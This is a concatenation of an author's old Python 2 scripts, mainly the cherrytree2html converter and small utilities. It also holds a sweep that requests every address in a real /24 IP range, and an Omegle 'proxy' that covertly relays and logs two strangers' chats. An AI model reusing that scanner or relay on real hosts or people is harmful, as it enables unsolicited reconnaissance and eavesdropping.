        lambda x: x.replaceWith(d.HTMLElement("")),
        filter(
            lambda x: x.getContent().strip() == "",
            node.find("p")
        )
    )

    replacements = [
        ("<p>",         "\n<p>"),
        ("</p>",        "</p>\n\n"),
        ("<p>\n",       "<p>"),
        ("<h",          "\n<h"),
        ("\t",          ""),
        ("<p><br />\n", "<p>"),
        ("<p></p>\n",   ""),
    ]

    regular_replacements = [
        (r"• (.*)</p>\n", r"<li>\1</li>\n</p>\n"),
        (r"• (.*)\n", r"<li>\1</li>\n"),
    ]

    str_node = str(node)

    for replacement in replacements:
        str_node = str_node.replace(replacement[0], replacement[1])

    for replacement in regular_replacements:
        str_node = re.sub(replacement[0], replacement[1], str_node)

    return str_node
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys
import shutil
import base64
import hashlib
import os.path


import parser as d
from parser import writeln
from getnodepath import *
from guessparagraphs import *


#= Variables ==================================================================
# do not wrap theese with <p>
DONT_WRAP = [
    "h1",
    "h2",
    "h3",
    "pre",
    "center",
    "table"
]


#= Functions & objects ========================================================
def _transformLink(tag, dom, node_id, out_dir, root_path):
    """
    Transform <rich_text link="webs http://kitakitsune.org">odkaz</rich_text>
    to <a href="http://kitakitsune.org">odkaz</a>.

    Also some basic link handling, ala local links and links to other nodes.
    """

    if "link" in tag.params:
        el = d.HTMLElement("<a>")
        el.childs = tag.childs

        # cherrytree puts string "webs "/"node " before every link for some
        # reason
        link = tag.params["link"]
        link = link[5:]

        if tag.params["link"].startswith("webs"):
            # absolute path to local files
            if link.startswith("http:///"):
                link = link[7:]
            # relative path to local files
            if link.startswith("http://.."):
                link = link[7:]
            # relative path to local files in current directory
            if link.startswith("http://./"):
                link = link[7:]
        elif tag.params["link"].startswith("file "):
            link = base64.b64decode(tag.params["link"].split()[1])

            # support for local images - I did tried to make it work as node,
            # but that failed miserably, because there is limit to picture
            # dimensions and other shitty crap
            file_type = link.split(".")
            pic_types = ["png", "gif", "jpg", "jpeg"]
            if len(file_type) >= 1 and file_type[-1].lower() in pic_types:
                directory = out_dir + "/pictures"
                if not os.path.exists(directory):
                    os.makedirs(directory)

                local_name = "%s/%s_%s" % (
                    directory,
                    hashlib.md5(link).hexdigest(),
                    os.path.basename(link)
                )

                shutil.copyfile(link, local_name)
        elif tag.params["link"].startswith("node "):
            # internal links contains only node id
            link_id = link.strip()

            # get nodename
            linked_nodename = dom.find("node", {"unique_id": str(link_id)})
            if not linked_nodename:
                writeln("Broken link to node ID '" + link_id + "'", sys.stderr)
                link = "[broken link to internal node]"
            else:
                # get (this) node depth
                depth = len(getNodePath(dom, node_id).split("/")) - 1
                link = "./" + (depth * "../") + getNodePath(dom, link_id)

        el.params["href"] = link.strip()

        el.endtag = d.HTMLElement("</a>")
        tag.replaceWith(el)


def _transformRichText(tag):
    "Transform tag ala <rich_text some='crap'> to real html tags."

    # skip richtext nodes with no parameters (they are removed later)
    if not tag.params:
        return

    # tags which contains nothing printable are converted just to its content
    # (whitespaces) "<h3> </h3>" -> " "
    if not tag.getContent().strip():
        tag.params = {}
        return

    rich_text_table = [
        {"attr_key": "weight",        "attr_val": "heavy",     "tag": "strong"},
        {"attr_key": "style",         "attr_val": "italic",    "tag": "i"},
        {"attr_key": "underline",     "attr_val": "single",    "tag": "u"},
        {"attr_key": "strikethrough", "attr_val": "true",      "tag": "del"},
        {"attr_key": "family",        "attr_val": "monospace", "tag": "tt"},
        {"attr_key": "scale",         "attr_val": "h1",        "tag": "h1"},
        {"attr_key": "scale",         "attr_val": "h2",        "tag": "h2"},
        {"attr_key": "scale",         "attr_val": "h3",        "tag": "h3"},
        {"attr_key": "scale",         "attr_val": "sup",       "tag": "sup"},
        {"attr_key": "scale",         "attr_val": "sub",       "tag": "sub"},
        {"attr_key": "scale",         "attr_val": "small",     "tag": "small"},
        {"attr_key": "justification", "attr_val": "center",    "tag": "center"},
        {"attr_key": "justification", "attr_val": "left",      "tag": None},
    ]

    def has_same_value(tag, trans):
        return tag.params[trans["attr_key"]] == trans["attr_val"]

    # transform tags
    for trans in rich_text_table:
        if trans["attr_key"] in tag.params and has_same_value(tag, trans):
            del tag.params[trans["attr_key"]]

            if trans["tag"]:
                # put HTML tag INTO rich_text
                el = d.HTMLElement("<" + trans["tag"] + ">")
                el.params = trans.get("params", {})
                el.childs = tag.childs
                tag.childs = [el]
                el.endtag = d.HTMLElement("</" + trans["tag"] + ">")


def _processTable(table):
    "Convert cherrytree table to HTML table."

    del table.params["char_offset"]

    html_table = str(table)

    html_table = html_table.replace("<cell>", "<td>")
    html_table = html_table.replace("</cell>", "</td>")
    html_table = html_table.replace("<row>", "<tr>")
    html_table = html_table.replace("</row>", "</tr>\n")

    return d.parseString(html_table)


def _processPicture(picture, out_dir, root_path):
    content = base64.b64decode(picture.getContent())

    if out_dir is not None:
        filename = hashlib.md5(content).hexdigest() + ".png"

        directory = out_dir + "/pictures"
        if not os.path.exists(directory):
            os.makedirs(directory)

        with open(directory + "/" + filename, "wb") as f:
            f.write(content)

    img = d.HTMLElement("<img />")

    if out_dir is not None:
        img.params["src"] = root_path + "/pictures/" + filename
    else:
        content = "".join(picture.getContent().split())
        img.params["src"] = "data:image/png;base64," + picture.getContent()

    return img


def _createReplacements(node, out_dir, root_path):
    """
    Create html versions of `replacements_tagnames` tags and put them into
    `replacements[]` variable. Remove `replacements_tagnames` from DOM.

    Transform <codebox>es to <pre> tags.

    CherryTree saves <codebox>es at the end of the <node>. Thats right - they
    are not in the source as all other tags, but at the end. Instead of
    <codebox> in the text, there is
    <rich_text justification="left"></rich_text>, which needs to be replaced
    with <pre>
    """
    def in_replacements_tagnames(x):
        return x.getTagName().lower() in ["codebox", "table", "encoded_png"]

    replacements = []
    for replacement in node.find("", fn=in_replacements_tagnames):
        el = None

        tag_name = replacement.getTagName()
        if tag_name == "codebox":
            el = d.HTMLElement("<pre>")
            el.childs = replacement.childs[:]
            el.params["syntax"] = replacement.params["syntax_highlighting"]
            el.endtag = d.HTMLElement("</pre>")
        elif tag_name == "table":
            el = _processTable(replacement)
        elif tag_name == "encoded_png":
            el = _processPicture(replacement, out_dir, root_path)
        else:
            raise ValueError(
                "This shouldn't happend." +
                "If does, there is new unknown <element>."
            )

        replacements.append(el)

        # remove original element (codebox/table) from DOM
        replacement.replaceWith(d.HTMLElement(""))

    return replacements


def convertToHtml(dom, node_id, do_anchors=True, out_dir=None, root_path=None):
    # get node element
    node = dom.find("node", {"unique_id": str(node_id)})[0]
    node = d.parseString(str(node)).find("node")[0]  # get deep copy

    # remove subnodes
    for n in node.find("node"):
        if n.params["unique_id"] != str(node_id):
            n.replaceWith(d.HTMLElement(""))

    replacements = _createReplacements(node, out_dir, root_path)

    def find_replacements_placeholder(node):
        return node.find(
            "rich_text",
            {"justification": "left"},
            fn=lambda x: x.getContent() == ""
        )

    # replace <rich_text justification="left"></rich_text> with tags from
    # `replacements`
    for cnt, rt in enumerate(find_replacements_placeholder(node)):
        if "link" in rt.params:  # support for pictures as links
            el = d.HTMLElement("<rich_text>")
            el.params["link"] = rt.params["link"]
            el.childs = [replacements[cnt]]
            el.endtag = d.HTMLElement("</rich_text>")
            rt.replaceWith(el)
        else:
            rt.replaceWith(replacements[cnt])
    #===========================================================================

    # transform all <rich_text> tags to something usefull
    for t in node.find("rich_text"):
        # transform <rich_text some="crap"> to html tags
        _transformRichText(t)

        # transform links
        _transformLink(t, dom, node_id, out_dir, root_path)

        # there are _arrays_ of rich_text with no params - this is not same as
        # <p>, because <p> allows nested parameters -> <p>Xex <b>bold</b></p>,
        # but cherry tree does shit like
        # <rich_text>Xex </rich_text><rich_text weight="heavy">bold</rich_text>
        # <rich_text></rich_text>
        if len(t.params) == 0:
            el = d.HTMLElement()
            el.childs = t.childs
            t.replaceWith(el)

    # convert text to paragraphs
    node = str(node).replace('<rich_text justification="left">', "")  # dont ask
    node = d.parseString(guessParagraphs(node, DONT_WRAP))

    if do_anchors:
        # apply anchors
        for head in node.find("h1") + node.find("h2") + node.find("h3"):
            anchor = "anchor_%s_%s" % (
                head.getTagName(), utfToFilename(head.getContent())
            )

            head.params["id"] = anchor

            # make head link to itself
            head.childs = [
                d.parseString(
                    "<a href='#" + anchor + "'>" + head.getContent() + "</a>"
                )
            ]

    return str(node.find("node")[0].getContent())
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import parser as d
from parser import write
from parser import writeln

from savenode import saveNode
from savenode import COPYRIGHT

from converttohtml import convertToHtml

from usertemplates import saveUserCSS
from usertemplates import generateAtomFeed
from usertemplates import getUserCodeboxTemplate
from usertemplates import removeSpecialNodenames
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import os.path
import unicodedata
from string import maketrans


import parser as d


#= Functions & objects ========================================================
def utfToFilename(nodename):
    "Convert UTF nodename to ASCII."

    intab = """ ?,@#$%^&*{}[]'"><°~\\|\t"""
    outtab = """_!!!!!!!!!!!!!!!!!!!!!!!"""
    trantab = maketrans(intab, outtab)

    nodename = nodename.decode("utf-8")
    s = unicodedata.normalize('NFKD', nodename).encode('ascii', 'ignore')

    return s.translate(trantab).replace("!", "")


def getNodePath(dom, nodeid):
    "Retun file path of node with given |nodeid|."

    # check if dom is already double-linked list
    if not hasattr(dom.childs[0], 'parent') or dom.childs[0].parent != dom:
        d.makeDoubleLinked(dom)

    # get reference to node
    node = dom.find("node", {"unique_id": str(nodeid)})[0]

    # check for filename in tags
    new_filename = None
    if "tags" in node.params and node.params["tags"].strip() != "":  # if tags are in node definition
        for i in node.params["tags"].split():                        # go thru tags
            if i.startswith("filename:"):                            # look for tag which starts with filename:
                i = i.split(":")
                new_filename = i[1] if len(i) > 1 else None
                break

    # does this node contain another nodes?
    endpoint = len(node.find("node")) <= 1

    # get path (based on node path in dom)
    path = ""
    while node.parent is not None and node.getTagName().lower() == "node":
        path = node.params["name"] + "/" + path
        node = node.parent

    if endpoint:
        path = path[:-1]  # remove '/' from end of the path
    else:
        path += "index"   # index file for directory
    path += ".html"

    # apply new_filename from from tags parameter of node
    if new_filename is not None:
        path = os.path.dirname(path)
        path += "/" if path.strip() != "" else ""
        path += new_filename

    return utfToFilename(path)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import os.path
from string import Template


from getnodepath import getNodePath
from converttohtml import convertToHtml


#= Variables ==================================================================
HTML_TEMPLATE = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//\
EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<head>
    <title>$title</title>

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

    <link rel="stylesheet" type="text/css" href="$rootpath/style.css" />
    <link rel="alternate"  type="application/atom+xml" href="atom.xml" />
</head>

<body>

$content

$copyright

</body>
</HTML>"""
COPYRIGHT = """
<!--
    Written in CherryTree, converted to HTML by cherrytree2html.py

    - http://www.giuspen.com/cherrytree/
    - https://github.com/Bystroushaak/cherrytree2html.py
-->
"""


#= Functions & objects ========================================================
def saveNode(dom, nodeid, html_template, out_dir, name=None, do_anchors=True):
    "Convert node to the HTML and save it to the HTML."

    nodeid = str(nodeid)
    filename = getNodePath(dom, nodeid)

    root_path = filename.count("/") * "../"
    root_path = root_path[:-1] if root_path.endswith("/") else root_path
    root_path = "." if root_path == "" else root_path

    # ugly, bud increase parsing speed a bit
    if name is None:
        name = dom.find("node", {"unique_id": nodeid})[0]
        name = name.params["name"]

    # generate filename, convert html
    data = convertToHtml(
        dom,
        nodeid,
        do_anchors=do_anchors,
        out_dir=out_dir,
        root_path=root_path,
    )

    # apply html template
    data = Template(html_template).substitute(
        content=data,
        title=name,
        copyright=COPYRIGHT,
        rootpath=root_path
    )

    # check if directory tree exists - if not, create it
    directory = out_dir + "/" + os.path.dirname(filename)
    if not os.path.exists(directory):
        os.makedirs(directory)

    fh = open(out_dir + "/" + filename, "wt")
    fh.write(data)
    fh.close()

    return filename
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ".ctd to .html convertor"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
#= Imports ====================================================================
import os
import re
import sys
import urllib

import os.path
import argparse


# splitted into smaller modules to prevent bloating
from richtextools import *


#= Variables ==================================================================
OUT_DIR = "output"


#= Functions & objects ========================================================
def printVersion():
    writeln(
        "%s by %s (%s)" % (__name, __author, __email)
    )


def listNodes(dom):
    "Return list of nodes and their IDs."

    ids = []
    nodes = ""
    for node in dom.find("node"):
        nodes += node.params["unique_id"].ljust(4) + "- " + node.params["name"]
        nodes += "\n"
        ids.append(int(node.params["unique_id"]))

    return ids, nodes


def rawXml(dom, node_id, do_anchors=None):
    "Just return node XML source."

    # get node element
    node = dom.find("node", {"unique_id": str(node_id)})[0]

    # remove subnodes
    for n in node.find("node"):
        if n.params["unique_id"] != str(node_id):
            n.replaceWith(d.HTMLElement(""))

    return str(node)


def _read_resource(path):
    """Try open and read data from given location."""
    if os.path.exists(path):
        with open(args.filename) as f:
            return f.read()

    return urllib.urlopen(path).read()


#= Main program ===============================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "filename",
        metavar="FN",
        action="store",
        default="",
        type=str,
        nargs="?",
        help="Filename."
    )
    parser.add_argument(
        "-v",
        "--version",
        action="store_true",
        default=False,
        help="Print version."
    )
    parser.add_argument(
        "-l",
        "--list",
        action="store_true",
        default=False,
        help="List names of all nodes."
    )
    parser.add_argument(
        "-i",
        "--interactive",
        action="store_true",
        default=False,
        help="Interactive mode - select node and convert it to HTML."
    )
    parser.add_argument(
        "-s",
        "--save",
        action="store_true",
        default=False,
        help="Save to file named [nodeid]_[ascii_nodename].html."
    )
    parser.add_argument(
        "-a",
        "--all",
        action="store_true",
        default=False,
        help="Save all nodes to HTML."
    )
    parser.add_argument(
        "-n",
        "--node",
        metavar="NODE ID",
        action="store",
        type=int,
        default=-1,
        help="Print converted node to stdout."
    )
    parser.add_argument(
        "-r",
        "--raw",
        action="store_true",
        default=False,
        help="Print raw node source code (XML)."
    )
    parser.add_argument(
        "--do-anchors",
        action="store_true",
        default=False,
        help="Put <h> anchors to the code."
    )
    args = parser.parse_args()

    if args.version:
        printVersion()
        sys.exit(0)

    if args.save and not os.path.exists(OUT_DIR):
        os.makedirs(OUT_DIR)

    if args.filename == "":
        writeln("You have to specify cherrytree xml file!", sys.stderr)
        sys.exit(1)

    # try open and read data from given location
    try:
        data = _read_resource(args.filename)
    except IOError:
        writeln("Can't read '" + args.filename + "'!", sys.stderr)
        sys.exit(2)

    def replace_strange_formatting(data):
        return re.sub("\n\t+<rich_text", "<rich_text", data)
        # return data.replace("\n\t\t<rich_text", "<rich_text")

    # read cherrytree file and parse it to the DOM
    dom = d.parseString(replace_strange_formatting(data))

    # raw - patch convertToHtml
    if args.raw:
        convertToHtml = rawXml

    # show content of cherrytree file
    if args.list:
        writeln(listNodes(dom)[1])
        sys.exit(0)

    # interactive mode
    elif args.interactive:
        ids, nodes = listNodes(dom)

        writeln(nodes, sys.stderr)
        writeln("Select node:\n", sys.stderr)

        # read userdata.
        selected = False
        while selected is not True:
            write(":> ", sys.stderr)
            nodeid = raw_input("")

            # try read number from user
            try:
                nodeid = int(nodeid)
                selected = True
            except ValueError:
                writeln("\nWrong node.\n", sys.stderr)
                continue

            # check if given number can be used as ID
            if nodeid not in ids:
                writeln("\nWrong node, pick different one.\n", sys.stderr)
                selected = False
                continue

        if args.save:
            nodename = saveNode(
                dom,
                nodeid,
                savenode.HTML_TEMPLATE,
                OUT_DIR,
                do_anchors=args.do_anchors
            )

            writeln("\nSaved to '" + nodename + "'")
        else:
            writeln(convertToHtml(dom, str(nodeid)))

    elif args.all:
        if not os.path.exists(OUT_DIR):
            os.makedirs(OUT_DIR)

        # remove nodes which names starts with __ (with exception of
        # usertemplates.SPECIAL_NODENAMES)
        removeSpecialNodenames(dom)

        generateAtomFeed(dom, OUT_DIR)

        # check if there is user's own html template - if so, use it
        html_template = savenode.HTML_TEMPLATE
        template = getUserCodeboxTemplate(dom, "__template")
        if template is not None:
            html_template = template

        # check for user's css style
        css = getUserCodeboxTemplate(dom, "__css")
        if css is not None:
            saveUserCSS(html_template, css, OUT_DIR)

        # convert all nodes to html
        for n in dom.find("node"):
            nodename = saveNode(
                dom,
                nodeid=n.params["unique_id"].strip(),
                html_template=html_template,
                out_dir=OUT_DIR,
                name=n.params["name"],
                do_anchors=args.do_anchors
            )

            writeln("Node '" + nodename + "' saved.")

        sys.exit(0)

    # convert selected node identified by nodeid in args.node
    elif args.node != -1:
        ids = listNodes(dom)[0]

        if args.node not in ids:
            writeln(
                "Selected ID '" + str(args.node) + "' doesn't exists!",
                sys.stderr
            )
            sys.exit(3)

        if args.save:
            nodename = saveNode(
                dom,
                nodeid=args.node,
                html_template=savenode.HTML_TEMPLATE,
                out_dir=OUT_DIR,
                do_anchors=args.do_anchors
            )

            writeln("Saved to '" + nodename + "'")
        else:
            writeln(convertToHtml(
                dom, args.node,
                do_anchors=args.do_anchors
            ))
            writeln(COPYRIGHT)
﻿# -*- coding: utf-8 -*- 
#~ NAME v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  
import urllib2, socket

socket.setdefaulttimeout(5)
file= open("ip_search_vysledky.txt", "w")

for i in range(256):
    try:
        fp= urllib2.urlopen("http://91.127.243."+ str(i))
        
        file.write(2*"\n")
        file.write("91.127.243."+ str(i)+ ":\n")
        file.write(fp.read())
        file.flush()
        
        fp.close()
        
        print "Adresa 91.127.243."+ str(i), "..\t [ok]"
    except:
        print "Adresa 91.127.243."+ str(i), "..\t err"
        
file.close()﻿# -*- coding: utf-8 -*- 
#~ FormTest v0.0.1 (25.02.07) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

import urllib, urllib2

adresa= "http://spreadsheets.google.com/formResponse?key=piYHG7JxUHxstW-8oPftQHQ"
parametry= {
    "single:7":"Bystroushaak",
    "single:8": "Litomerice",
    "group:2": " žloutenka typu B",
    "group:3": "zánět močového měchýře",
    "single:5": "Tento formular byl vyplnen scriptem od Bystroushaaka!"}

params= urllib.urlencode(parametry)  # Prekoduje parametry do tvaru vhodneho pro odeslani 
req= urllib2.Request(adresa, params) # Vytvori request, coz je smichanina adresy a parametru, pripadne i hlavicek

spojeni = urllib2.urlopen(req)       # Otevre
spojeni.read()                       # a nacte stranku
spojeni.close()#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# omegleProxy v1.0.0 (06.06.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in Geany text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import CheckerTools as ch
import sys
import thread
import time
import urllib
import urllib2


#===============================================================================
# Variables ====================================================================
#===============================================================================
start_url      = "http://omegle.com/start?rcs=1&spid="
event_url      = "http://omegle.com/events"
typing_url     = "http://omegle.com/typing"
send_url       = "http://omegle.com/send"
disconnect_url = "http://omegle.com/disconnect"
gid = ["", ""]


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def printCaptchaErr():
    print
    print
    print ">>> Ouch, omegle puts CAPTCHA into chat."
    print ">>> You have to manualy open http://omegle.com and pass throught CAPTCHA."
    print ">>> After that, this script will again work for some time.."
    print
    print

def getMessage(msg):
    if msg.startswith("[[\"gotMessage"):
        return msg.replace("[[\"gotMessage\", ", "")[:-3][1:]
    
    return msg.split('", "')[-1][:-3]
            
def proxy(who):
    if who < 0 or who > 1:
        raise UserWarning("Bad argument; who = " + str(who) + " (must be 0 or 1)")
        
    companion = -1
    if who == 1:
        companion = 0
    else:
        companion = 1
        
    # start conversation
    id = ch.getPage(start_url).replace("\"", "")
        
    param = {"id" : id}
    
    print "--> Thread " + str(who) + " got ID (" + id + ")"
    
    # wait until someone connect to you
    print "  * " + id + " Waiting for connection .."
    msg = ""
    while "connected" not in msg:
        msg = ch.getPage(event_url, param)
        
        if "recaptcha" in msg:
            printCaptchaErr()
            sys.exit()
            
        time.sleep(1)
        
    # save id into global variable (second instance will send messages with this id)
    gid[who] = id
    print "--> " + id + " connected to stranger"
    
    # wait for companion
    while gid[companion] == "":
        time.sleep(0.5)
    
    # do work..
    msg = ""
    cparam = {}
    while not '"strangerDisconnected"' in msg:
        try:
            msg = ch.getPage(event_url, param)
        except urllib2.URLError:
            continue
        
        # if second thread is not runinng disconnect yourself
        if gid[companion] == "":
            break

        # set cparam - companion param (could be overwriten by sending msg..)            
        cparam = {"id" : gid[companion]}
    
        # send typing msg
        if '"typing"' in msg:
            #~ print "  * " + id + " is typing"
            try:
                ch.getPage(typing_url, cparam)
            except urllib2.URLError:
                continue
            continue
            
        # send message
        if '"gotMessage"' in msg:
            msg = getMessage(msg)
            print "  <" + id + "> " + msg
            cparam["msg"] = msg
            try:
                ch.getPage(send_url, cparam)
            except urllib2.URLError:
                continue
            continue
        
        # captcha :/    
        if "recaptcha" in msg:
            printCaptchaErr()
            sys.exit()
            continue

        # if second thread is not runinng disconnect yourself
        if gid[companion] == "":
            break
    
    try:
        ch.getPage(disconnect_url, cparam)
    except:
        pass
        
    print "<-- " + id + " leaved channel"
    gid[who] = ""
            

#===============================================================================
#= Main program ================================================================
#===============================================================================
ch.IEHeaders["Referer"] = "http://omegle.com/"  # permanently change referer
ch.IEHeaders["Accept"] = "application/json"

# start conversation
try:
    thread.start_new_thread(proxy, (0,))
    proxy(1)
except KeyboardInterrupt:
    ch.getPage(disconnect_url, {"id" : gid[0]})
    ch.getPage(disconnect_url, {"id" : gid[1]})
    sys.exit()﻿# -*- coding: utf-8 -*- 
#~ NAME v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

import Image, urllib, ClientCookie

fp= ClientCookie.urlopen("http://blog.monogram.sk/pokojny/cvicenia/programming_line/image.php")
data= fp.read()
fp.close()

file= open("pokus.png", "wb")
file.write(data)
file.close()

im= Image.open("pokus.png")

ys= [im.getbbox()[1], im.getbbox()[3]-1]
sour= []

for y in ys:
    for x in range(im.getbbox()[2] - im.getbbox()[0]):
        if im.getpixel((x+ im.getbbox()[0], y))==1:
            sour+= [str(x+ im.getbbox()[0]), str(y)]

if sour[0]<sour[2]:
    souradnice= "("+ sour[0]+ ","+ sour[1]+ "),("+ sour[2]+ ","+ sour[3]+ ")"
elif sour[0]>sour[2]:
    souradnice= "("+ sour[2]+ ","+ sour[3]+ "),("+ sour[0]+ ","+ sour[1]+ ")"

print souradnice

fp= ClientCookie.urlopen("http://blog.monogram.sk/pokojny/cvicenia/programming_line/result.php?result="+ souradnice)
print fp.read()
fp.close()







# -*- coding: utf-8 -*- 
#~ NAME v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

import os

cmd= ""
povolene_prikazy= ["irssi",
                    "vim",
                    "exit"]

print "Povolene prikazy:"
for i in povolene_prikazy:
    print i+ ",",
print "\n"    

while cmd!="exit":
    try:
        cmd= raw_input(":> ")
        
        if povolene_prikazy.count(cmd)==1:
            os.system(cmd)
        else:
            print "Nepovoleny prikaz!"
    except:
        print "Ouch ^-^'"
    
    
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import random
import time

#===============================================================================
# Variables ====================================================================
#===============================================================================



#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def getRand(n = 10):
    out = []
    for i in range(n):
        out.append(random.randint(0, 1))

    return out

def gauss(size = 10, itterations = 10):
    out = getRand(size)
    
    for i in range(itterations - 1):
        out = map(lambda x, y: x + y, out, getRand(size))
        
    return out
    
    
# cui
def horizontalBuffer(data, veight = 0):
    buffer = []
    tmp = ""
    
    if veight < max(data):
        veight = max(data)
    
    for line_num in range(veight):
        for i in data:
            if (i > line_num):
                tmp += "* "
            else:
                tmp += "  "
                
        buffer.append(tmp)
        tmp = ""
        
    buffer.reverse()
    
    return "\n".join(buffer)
    

def clear():
    if os.name == "posix":
        os.system('clear')
    elif os.name in ("nt", "dos", "ce"):
        os.system('CLS')
    else: pass
        

#===============================================================================
#= Main program ================================================================
#===============================================================================
SIZE = 10

av = []
tmp = []

buffer = ""

av_status = ""
tmp_status = ""
buffer_size = 0

av_buffer = ""
tmp_buffer = ""

cnt = 1
while True:
    tmp = gauss(SIZE)
    
    if (cnt == 1):
        av = tmp
    
    if (buffer_size < max(tmp)):
        buffer_size = max(tmp)
    if (buffer_size < max(av) / cnt):
        buffer_size = max(av) / cnt
    
    for i in range(len(tmp)):
        av[i] = av[i] + tmp[i]
        tmp_buffer += str(tmp[i]) + " "
        
    tmp_buffer = "New:\n" + horizontalBuffer(tmp, buffer_size) + "\n" + tmp_buffer
    
    for i in range(len(tmp)):
        tmp[i] = int(av[i]) / cnt
        av_buffer += str(int(av[i]) / cnt) + " "
    
    av_buffer = "Average:\n" + horizontalBuffer(tmp, buffer_size) + "\n" + av_buffer
    
    if cnt < 5:
        tmp_buffer = ""
        av_buffer = ""
        cnt += 1
        continue
    
    tmp_buffer = tmp_buffer.splitlines()
    av_buffer = av_buffer.splitlines()
    
    print
    print "Kde udělal Gauss (nebo spis Bystroushaak) chybu?"
    print "http://cs.wikipedia.org/wiki/Gaussovo_rozlo%C5%BEen%C3%AD"
    print
    
    for i in range(len(av_buffer)):
        print av_buffer[i].center(40) + tmp_buffer[i].center(40)
    
    tmp_buffer = ""
    av_buffer = ""
    
    time.sleep(0.2)
    clear()
    cnt += 1





#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Cislovac.py v1.1.0

# imports
import sys

# main program
out= False

if len(sys.argv) == 1:
    print "\nUsage:\n\tpython Cislovac.py [OPTIONS] filename.txt\n\n\t\t-o\n\t\t\tWrite output into infile.\n\n"
    sys.exit()

filename= sys.argv[1]

if filename == "-o":
    filename= sys.argv[2]
    out= True

try:
    file = open(filename, "r")
    data = file.readlines()
    file.close()
except IOError, e:
    print "Error!"
    print "Infile \"" + filename + "\" not found!"
    sys.exit()

if out:
    file= open(filename, "w")

cnt= 1
for i in range(len(data)):
    if len(data[i]) >= 9:   # minimalni velikost ip adresy a portu
        if out:
            file.write(str(cnt) + "=" + data[i].splitlines()[0] + "\n")
        else:
            print str(cnt) + "=" + data[i].splitlines()[0]
            
        cnt+= 1
    
if out:
    file.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# DOMer v0.2.0 (25.08.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # This tool is usefull probably only as search console for dhtmlparser.
# TODO:
    # Fixnout index tak, aby odpovídaly třeba JS DOMu, nebo něčemu trochu víc sane.
#= Imports =====================================================================
import urllib
import argparse

import dhtmlparser as d



#= Functions & objects =========================================================
def search(e, depth):
    s = e.__str__()
    i = s.lower().find(SEARCH.lower()) if IGNORE_CS else s.find(SEARCH)

    if i >= 0:
        if i + len(SEARCH) + N < len(s):
            s = s[:i + len(SEARCH) + N] + " ..."
        if i - N > 0:
            s = "... " + s[i - N:]
        s = s.replace("\n", "")
        s = s.replace(SEARCH, " >> " + SEARCH + " << ")

        print str(depth)
        print s


def recWr(el, depth = 0):
    cnt = -1
    for e in el.childs:
        cnt += 1
        if e.isTag() and not e.isEndTag(): # show only openners, nonpair and comments
